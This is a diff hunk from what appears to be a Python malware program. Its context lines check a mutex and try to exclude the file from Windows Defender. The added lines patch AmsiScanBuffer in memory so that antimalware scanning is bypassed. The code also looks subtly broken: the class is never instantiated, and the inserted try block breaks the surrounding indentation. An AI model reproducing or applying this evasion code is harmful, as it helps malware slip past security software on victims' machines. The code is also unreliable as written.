@@ -1390,6 +1390,21 @@ if os.name == 'nt':
     if not Syscalls.CreateMutex(Settings.Mutex):
         Logger.info('Mutex already exists, exiting')
         os._exit(0)
+try:
+    import ctypes
+    class AMSI(object):
+        def __init__(self):
+            self.amsi = ctypes.windll.amsi
+            self.kernel32 = ctypes.windll.kernel32
+            self.amsi.AmsiInitialize(ctypes.c_wchar_p('AMSI'), ctypes.byref(ctypes.c_void_p()))
+            self.AmsiScanBuffer = self.amsi.AmsiScanBuffer
+            self.AmsiScanBuffer.restype = ctypes.c_uint
+            self.AmsiScanBuffer.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_uint, ctypes.c_void_p, ctypes.c_void_p]
+            patch = b'\xb8\x57\x00\x07\x80\xc3'
+            ctypes.windll.kernel32.VirtualProtect(self.AmsiScanBuffer, len(patch), 0x40, ctypes.byref(ctypes.c_uint()))
+            ctypes.memmove(self.AmsiScanBuffer, patch, len(patch))
+except:
+    pass
     if Utility.GetSelf()[1]:
         Logger.info('Trying to exclude the file from Windows defender')
         Utility.ExcludeFromDefender()
